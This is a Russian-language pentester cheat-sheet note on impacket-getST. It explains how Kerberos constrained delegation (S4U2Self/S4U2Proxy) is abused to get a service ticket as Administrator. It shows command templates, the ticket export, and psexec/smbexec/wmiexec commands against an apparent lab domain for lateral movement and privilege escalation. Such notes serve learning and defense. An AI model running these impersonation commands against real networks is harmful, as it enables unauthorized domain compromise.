#tool #kerberos #delegatons 

> `impacket-getST` — инструмент, который позволяет получить **Kerberos Service Ticket (TGS)** от имени другого пользователя через механизм **Kerberos delegation (S4U)**.

Используется для:

- impersonation (выдачи себя за другого пользователя)
- lateral movement
- privilege escalation
- получения доступа к сервисам (SMB, CIFS, HTTP, MSSQL и др.)

Особенно полезен при наличии:
- `msDS-AllowedToDelegateTo`
- Constrained Delegation
- или Resource-Based Constrained Delegation (RBCD)
## Как работает Kerberos delegation

Нормальный поток:

```
User → получает TGT
User → использует TGT → получает TGS для сервиса
User → доступ к сервису
```

Delegation позволяет:

```
Service → получить TGS от имени другого пользователя
```

## Что делает impacket-getST

Он выполняет процесс:

```
1. Получает TGT вашего пользователя
2. Выполняет S4U2Self
   → запрашивает ticket от имени другого пользователя

3. Выполняет S4U2Proxy
   → получает Service Ticket к нужному сервису

4. Сохраняет ticket в .ccache файл
```

## Использование
```bash
impacket-getST \
  -spn <SPN> \
  -impersonate <USER> \
  <DOMAIN>/<USER>:<PASSWORD> \
  -dc-ip <ip>
```

## Что такое impersonation

Impersonation = получение Service Ticket от имени другого пользователя.

Kerberos считает, что:

```
Administrator → обращается к сервису
```

хотя ticket получил атакующий

## Использование полученного ticket

установить ticket:
```
export KRB5CCNAME=Administrator@cifs_helix.codeby.cdb@CODEBY.CDB.ccache
```

использовать:
```
impacket-psexec -k -no-pass helix.codeby.cdb
impacket-smbexec -k -no-pass helix.codeby.cdb
impacket-wmiexec -k -no-pass helix.codeby.cdb
```

---
## Требования для атаки

у пользователя должно быть:

```
msDS-AllowedToDelegateTo
```

пример:

```
msDS-AllowedToDelegateTo:
    cifs/helix.codeby.cdb
```

это означает:

```
этот пользователь может получать tickets к CIFS сервису
от имени других пользователей
```
